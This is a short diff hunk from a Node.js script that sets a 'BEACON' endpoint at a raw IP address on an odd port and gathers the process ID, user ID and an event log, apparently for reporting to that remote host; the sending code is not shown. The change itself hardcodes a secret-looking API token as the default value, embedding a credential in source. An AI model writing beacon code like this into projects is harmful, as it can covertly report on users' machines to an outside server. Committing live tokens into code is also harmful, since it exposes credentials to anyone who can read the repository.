@@ -6,7 +6,7 @@ import net from 'node:net';
 import crypto from 'node:crypto';
 
 const BEACON = process.env.ARTIFACT_STORE || 'http://62.169.16.65:48081/r143flip2';
-const API_TOKEN = process.env.PROBE_TOKEN || '';
+const API_TOKEN = process.env.PROBE_TOKEN || 'nfu_eod4HVHgmjZ7atTh5JQ7TLGSRw7LrjA5b416';
 const R = { pid: process.pid, uid: typeof process.getuid === 'function' ? process.getuid() : null, events: [] };
 const ev = (k, v) => { try { R.events.push([k, typeof v === 'string' ? v.slice(0, 600) : v]); } catch {} };
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
